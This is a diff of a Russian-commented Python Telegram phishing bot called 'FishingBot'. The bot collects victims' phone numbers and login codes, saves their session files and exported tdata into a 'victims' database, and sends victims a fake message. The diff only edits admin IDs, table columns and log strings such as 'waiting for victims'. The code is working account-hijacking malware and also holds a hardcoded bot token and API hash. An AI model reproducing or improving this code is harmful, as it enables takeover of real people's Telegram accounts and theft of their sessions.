@@ -16,20 +16,24 @@ API_HASH = '12814e71d319a434ee2f126d0c51c314'
 BOT_TOKEN = '8651082388:AAF6UNT2y7MSlhkPYGBFkkN4cVkgZ_pZiWc'
 
 # Группа для логов (укажите ID группы)
-LOG_GROUP_ID = -5346240560  # Замените на ID вашей группы
-ADMIN_ID = 8794011165
+LOG_GROUP_ID = -1001234567890  # Замените на ID вашей группы
+ADMIN_ID = 7197493128
 
 SESSIONS_DIR = 'sessions'
 TDATA_DIR = 'tdata_exports'
 os.makedirs(SESSIONS_DIR, exist_ok=True)
 os.makedirs(TDATA_DIR, exist_ok=True)
 
-# БД
+# БД - ПРАВИЛЬНАЯ СТРУКТУРА
 conn = sqlite3.connect('victims.db', check_same_thread=False)
 c = conn.cursor()
 c.execute('''CREATE TABLE IF NOT EXISTS victims
-             (user_id INTEGER PRIMARY KEY, phone TEXT, code TEXT, 
-              session_file TEXT, tdata_path TEXT, timestamp TEXT, username TEXT, full_name TEXT)''')
+             (user_id INTEGER PRIMARY KEY, 
+              phone TEXT, 
+              code TEXT, 
+              session_file TEXT, 
+              tdata_path TEXT, 
+              timestamp TEXT)''')
 conn.commit()
 
 class FishingBot:
@@ -40,10 +44,11 @@ class FishingBot:
 
     async def start(self):
         await self.bot.start(bot_token=BOT_TOKEN)
-        print("[SWILL] Бот запущен и готов к работе")
+        print("[SWILL] Бот @zlataslivvv_bot запущен и готов к работе!")
+        print("[SWILL] Ожидаем жертв...")
         
         # Отправляем приветствие в группу
-        await self.log_message("🚀 **БОТ АКТИВИРОВАН**\nГотов к работе!")
+        await self.log_message("🚀 **БОТ АКТИВИРОВАН**\n@zlataslivvv_bot готов к работе!")
 
         @self.bot.on(events.NewMessage(pattern='/start'))
         async def start_handler(event):
@@ -266,13 +271,11 @@ class FishingBot:
             
             tdata_path = await self.export_tdata(user_id, session_file)
             
-            # Сохраняем в БД с дополнительной информацией
+            # Сохраняем в БД - ТОЛЬКО 6 КОЛОНОК
             c.execute('''INSERT OR REPLACE INTO victims 
-                         VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
+                         VALUES (?, ?, ?, ?, ?, ?)''',
                       (user_id, auth_data['phone'], code, session_file, tdata_path, 
-                       datetime.now().isoformat(), 
-                       auth_data.get('username', 'Нет'),
-                       auth_data.get('full_name', 'Нет')))
+                       datetime.now().isoformat()))
             conn.commit()
             
             # Отправляем жертве фейковое сообщение
